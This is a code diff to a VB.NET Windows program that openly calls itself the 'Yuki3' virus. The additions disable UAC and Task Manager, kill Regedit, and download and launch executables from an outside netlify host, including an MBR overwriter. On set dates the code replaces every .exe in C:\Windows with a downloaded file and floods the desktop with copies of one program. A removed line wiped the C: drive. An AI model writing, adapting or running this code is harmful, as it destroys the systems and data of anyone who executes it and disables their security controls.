@@ -7,9 +7,20 @@ Imports System.Security.AccessControl
 Imports System.Management
 Imports System.Threading
 Imports System.IO.Compression
+Imports System.Runtime.InteropServices
 
 
 Public Class Form1
+    Private Const SPI_SETDESKWALLPAPER As Integer = 20
+    Private Const SPIF_UPDATEINIFILE As Integer = &H1
+    Private Const SPIF_SENDWININICHANGE As Integer = &H2
+    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
+    Private Shared Function SystemParametersInfo(ByVal uAction As Integer,
+        ByVal uParam As Integer, ByVal lpvParam As String,
+        ByVal fuWinIni As Integer) As Integer
+    End Function
+    ' Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
+    Private Declare Function CreatePatternBrush Lib "gdi32" (ByVal hBitmap As IntPtr) As IntPtr
     Dim working As Boolean = True
     Dim RegistryKey As Object
     Dim admin As Boolean = True
@@ -25,18 +36,66 @@ Public Class Form1
     Dim download9 As Boolean = False
     Dim download10 As Boolean = False
     Dim download11 As Boolean = False
+    Dim download12 As Boolean = False
     Dim Check4BadFile As Boolean = False
     Dim des = fakememz
 
 
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
-        HideTaskManager()
-        downloadwavFiles()
-        Wait2DisPros.RunWorkerAsync()
-        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
-            des = True
-            MsgBox("you are currently running the destructive version of this program", 0 + 64, "note")
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav
+
+        'MsgBox(Application.StartupPath)
+        If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
+            Dim result As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( SHOULD I STILL EXECUTE THE PROGRAM )", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
+            If result = DialogResult.Yes Then
+                Dim result2 As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( THIS IS YOUR LAST WARNING SHOULD I STILL EXECUTE PROGRAM )", "THIS IS YOUR LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
+                Try
+                    My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
+                Catch ex2 As Exception
+
+                End Try
+
+                If result2 = DialogResult.Yes Then
+                    Dim result5 As DialogResult = MessageBox.Show("Do you want to enable the destructive version of this program?", "IF YOU ENABLE THIS IT WILL DESTROY YOUR COMPUTER EVENTUALLY", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
+                    If result5 = DialogResult.Yes Then
+                        Dim sb As New System.Text.StringBuilder
+                        sb.AppendLine("{true}")
+                        Try
+                            IO.File.WriteAllText(Application.StartupPath & "\destructive.yuki3", sb.ToString())
+                        Catch ex2 As Exception
+
+                        End Try
+                    Else
+                        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+                            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\destructive.yuki3")
+                        End If
+                    End If
+                    My.Settings.infected = True
+                    'runasadmin()
+
+                    ' Me.Close()
+                Else
+                    RemoveVirus.RunWorkerAsync()
+                    MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
+
+                    'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
+                    Me.Close()
+                End If
+            Else
+                RemoveVirus.RunWorkerAsync()
+                MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
+                Me.Close()
+
+            End If
         End If
+
+
+        HideTaskManager()
+
+        Wait2DisPros.RunWorkerAsync()
+
+
+
+
 
 
 
@@ -80,13 +139,31 @@ Public Class Form1
         Try
             download8 = True
             My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+         "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
         "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
 
         Catch ex As Exception
 
         End Try
 
+        Try
+            download8 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/yuki3.f.exe",
+        "C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe")
+
+        Catch ex As Exception
+
+        End Try
+        Try
+            download8 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/hahau.wav
+        "C:\Users\" & SystemInformation.UserName & "\hahau.wav")
+
+        Catch ex As Exception
+
+        End Try
         Try
             download8 = True
             My.Computer.Network.DownloadFile(
@@ -215,9 +292,25 @@ Public Class Form1
             fileq.Close()
             Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
             File.Delete("C:\YFShshfgsd.yuki")
-
+            ' to fix UAC C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
             RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
             RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
+            MyUtilities.RunCommandCom("reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", "/W", True) 'fucks UAC\
+
+
+
+            If My.Settings.fucked = True Then
+                If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\fucked.yuki3") Then
+
+                End If
+
+            End If
+            Dim sb As New System.Text.StringBuilder
+            sb.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+            sb.AppendLine("exit")
+            sb.AppendLine("del fuckUAC.bat")
+            IO.File.WriteAllText("fuckUAC.bat", sb.ToString())
+            Process.Start("fuckUAC.bat")
             Try
                 My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
             Catch ex As Exception
@@ -243,41 +336,26 @@ Public Class Form1
                     Else
                         My.Computer.FileSystem.DeleteFile("yuki3.exe.config")
                     End If
-                    downloadwavFiles()
+
 
                 Else
-                    downloadwavFiles()
-                    Dim result As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( SHOULD I STILL EXECUTE THE PROGRAM )", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
-                    If result = DialogResult.Yes Then
-                        Dim result2 As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( THIS IS YOUR LAST WARNING SHOULD I STILL EXECUTE PROGRAM )", "THIS IS YOUR LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
-                        Try
-                            My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
-                        Catch ex2 As Exception
 
-                        End Try
 
-                        If result2 = DialogResult.Yes Then
-                            My.Settings.infected = True
-                            runasadmin()
 
-                            Me.Close()
-                        Else
-                            RemoveVirus.RunWorkerAsync()
-                            MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
-
-                            'https://incomparable-cascaron-802b94.netlify.app/Remove_Yuki_Virus.exe
-                            Me.Close()
-                        End If
+                    If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+                        des = True
+                        MsgBox("you are currently running the destructive version of this program", 0 + 64, "note")
                     Else
-                        RemoveVirus.RunWorkerAsync()
-                        MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
-                        Me.Close()
 
                     End If
 
+
                 End If
 
+
             End If
+
+
         End Try
 
 
@@ -305,9 +383,23 @@ Public Class Form1
                     ur_pc_is_gone_lmao.Show()
                 End If
 
+                If day = 10 AndAlso month = 4 Then
+
+                    Timer1.Start()
+                End If
+                If day = 1 AndAlso month = 4 Then
+
+                    earrape.Show()
+                End If
                 If day = 1 AndAlso month = 4 Then
 
                     Timer1.Start()
+                End If
+                If day = 5 AndAlso month = 10 Then
+                    Dim exeResource As Byte() = My.Resources.Yuki3Antivirus
+                    Dim exePath As String = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Yuki3Antivirus.exe")
+                    System.IO.File.WriteAllBytes(exePath, exeResource)
+                    System.Diagnostics.Process.Start(exePath)
                 End If
                 If day = 1 AndAlso month = 5 Then
                     Process.Start("https://youareanidiot.cc/")
@@ -400,34 +492,105 @@ Public Class Form1
                 If day = 22 AndAlso month = 11 Then '
                     Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                 End If
-                If day = 1 AndAlso month = 12 Then
-                    My.Settings.working = False
-                    Try
-                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
-                    Catch ex As Exception
-                        MsgBox(ex.ToString, 0 + 16, "error")
-                    End Try
+                If day = 18 AndAlso month = 12 Then
+
 
                     '  My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                     ' RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
-                    If des = True Then
-                        Dim startInfo As New ProcessStartInfo("CMD.EXE")
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
-                        startInfo.CreateNoWindow = True
-                        startInfo.UseShellExecute = False
-                        startInfo.Arguments = "RD C:\ /S /Q"
-                        Process.Start(startInfo)
+                    If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
 
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
-                        startInfo.CreateNoWindow = True
-                        startInfo.UseShellExecute = False
-                        startInfo.Arguments = "del c:\windows\system32*.* /q"
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
-                        startInfo.CreateNoWindow = True
-                        startInfo.UseShellExecute = False
 
+
+                        Try
+                            download8 = True
+                            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp", 'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
+        "C:\Users\" & SystemInformation.UserName & "\w.bmp")
+                            Try
+                                Dim bmp As New Bitmap("C:\Users\" & SystemInformation.UserName & "\w.bmp")
+                                Dim brush As IntPtr = CreatePatternBrush(bmp.GetHbitmap())
+                                SystemParametersInfo(&H14, 0, brush, &H1 Or &H2)
+                            Catch ex As Exception
+
+                            End Try
+
+                        Catch ex As Exception
+
+                        End Try
+
+
+
+
+                        '"C:\Users\" & SystemInformation.UserName & "\hahau.wav"
+                        Try
+                            If Not My.Computer.FileSystem.FileExists("fucked.yuki3") Then
+                                My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\hahau.wav", AudioPlayMode.BackgroundLoop)
+                            End If
+
+                        Catch ex As Exception
+
+                        End Try
+                        Dim sb2 As New System.Text.StringBuilder
+                        CopyIexmeme.Start() 'oh hell no man what the fuck
+                        sb2.AppendLine(":a")
+                        '  sb.AppendLine("copy " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\explore.exe iexplore_%RANDOM%.exe")
+                        ' 'sb.AppendLine("goto a")
+                        Try
+                            IO.File.WriteAllText("C:\Users\" & SystemInformation.UserName & "\fucked.yuki3", sb2.ToString())
+                        Catch ex As Exception
+
+                        End Try
+
+                        fucked.RunWorkerAsync()
+                        Try
+                            download8 = True
+                            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/killpc.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
+        "C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
+                            '   Process.Start("C:\Users\" & SystemInformation.UserName & "\systemrepair.exe")
+                        Catch ex As Exception
+                            MsgBox(ex.ToString)
+                        End Try
+
+                        Try
+                            download8 = True
+                            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/MbrOverwriter.exe", 'https://incomparable-cascaron-802b94.netlify.app/killpc.exe
+        "C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
+                            Process.Start("C:\Users\" & SystemInformation.UserName & "\MbrOverwriter.exe")
+                        Catch ex As Exception
+                            MsgBox(ex.ToString)
+                        End Try
+                        Try
+                            My.Computer.Network.DownloadFile(
+       "https://incomparable-cascaron-802b94.netlify.app/iexplore.exe", 'https://incomparable-cascaron-802b94.netlify.app/iexplore
+      Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe")
+                            Dim sb As New System.Text.StringBuilder
+
+
+                            CopyIexmeme.Start() 'oh hell no man what the fuck
+
+                            '  sb.AppendLine(":a")
+                            '  sb.AppendLine("copy " & Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\explore.exe iexplore_%RANDOM%.exe")
+                            ' 'sb.AppendLine("goto a")
+                            'IO.File.WriteAllText("urfucked.bat", sb.ToString())
+                            'Process.Start("urfucked.bat")
+
+                        Catch ex As Exception
+
+                        End Try
+
+
+                        Dim s As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
+                        ' MyUtilities.RunCommandCom(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Remove_Yuki_Virus.exe", "/W", True)
                         MsgBox("your PC is fucked now try rebooting", 0 + 64, "YUKI3")
                     Else
+                        My.Settings.working = False
+                        Try
+                            My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
+                        Catch ex As Exception
+                            MsgBox(ex.ToString, 0 + 16, "error")
+                        End Try
                         Yuki_credits.Show()
                     End If
 
@@ -469,7 +632,11 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
+        downloadwavFiles()
+
     End Sub
+
+
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Try
@@ -530,54 +697,54 @@ Public Class Form1
         Dim p() As Process
 
         p = Process.GetProcessesByName("Regedit")
-            If p.Count > 0 Then
-                If working1 = False Then
-                    working1 = True
+        If p.Count > 0 Then
+            If working1 = False Then
+                working1 = True
 
-                    Try
-                        Process.GetProcessesByName("Regedit")(0).Kill()
-                    Catch ex As Exception
+                Try
+                    Process.GetProcessesByName("Regedit")(0).Kill()
+                Catch ex As Exception
 
-                    End Try
-                    Try
-                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
-                    Catch ex As Exception
+                End Try
+                Try
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
 
-                    End Try
-                    working1 = False
-                End If
-
-
-            Else
-
-                ' Process is not running
+                End Try
+                working1 = False
             End If
 
 
+        Else
 
-            p = Process.GetProcessesByName("Taskmgr")
-            If p.Count > 0 Then
-                If working1 = False Then
-                    working1 = True
-
-                    Try
-                        Process.GetProcessesByName("Taskmgr")(0).Kill()
-                    Catch ex As Exception
-
-                    End Try
-                    Try
-                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
-                    Catch ex As Exception
-
-                    End Try
-                    working1 = False
-                End If
+            ' Process is not running
+        End If
 
 
-            Else
 
-                ' Process is not running
+        p = Process.GetProcessesByName("Taskmgr")
+        If p.Count > 0 Then
+            If working1 = False Then
+                working1 = True
+
+                Try
+                    Process.GetProcessesByName("Taskmgr")(0).Kill()
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+                working1 = False
             End If
+
+
+        Else
+
+            ' Process is not running
+        End If
 
 
 
@@ -728,7 +895,7 @@ Public Class Form1
                 End If
             End If
 
-            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav") Then '
+            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav") Then 'ohnotooload.wav
             Else
                 If download5 = True Then
                     Try
@@ -743,7 +910,20 @@ Public Class Form1
                 End If
             End If
 
+            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav") Then 'ohnotooload.wav
+            Else
+                If download12 = True Then
+                    Try
+                        My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
+   "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                    Catch ex As Exception
 
+                    End Try
+
+                End If
+            End If
 
             If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe") Then '
             Else
@@ -887,6 +1067,14 @@ Public Class Form1
         Catch ex As Exception
 
         End Try
+        Try
+            download12 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
+        "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
+
+        Catch ex As Exception
+        End Try
     End Function
 
     Private Sub RemoveVirusStart_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles RemoveVirus.DoWork
@@ -992,7 +1180,35 @@ Public Class Form1
     Private Sub fakememz_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fakememz.DoWork
 
     End Sub
+    Dim intcois As Integer = 0
+    Private Sub CopyIexmeme_Tick(sender As Object, e As EventArgs) Handles CopyIexmeme.Tick
+        'Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe"
+        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe") = True Then
+            intcois = intcois + 1
+            System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore" & intcois & ".exe")
+        End If
+        If intcois > 300 Then
+            CopyIexmeme.Stop()
+        End If
+    End Sub
+
+    Private Sub fucked_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fucked.DoWork
+        Dim directoryPath As String = "C:\Windows"
+        Dim fileList() As String = Directory.GetFiles(directoryPath, "*.exe")
+        For Each filePath As String In fileList
+            ' Delete the file
+            Try
+                File.Delete(filePath)
+                System.IO.File.Copy("C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe", filePath)
+            Catch ex As Exception
+
+            End Try
+
+        Next
+
+    End Sub
 End Class
+
 
 Public Class MyUtilities
     Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
@@ -1001,6 +1217,7 @@ Public Class MyUtilities
         pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
         pi.FileName = "cmd.exe"
         p.StartInfo = pi
+        ' p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
         p.Start()
     End Sub
 
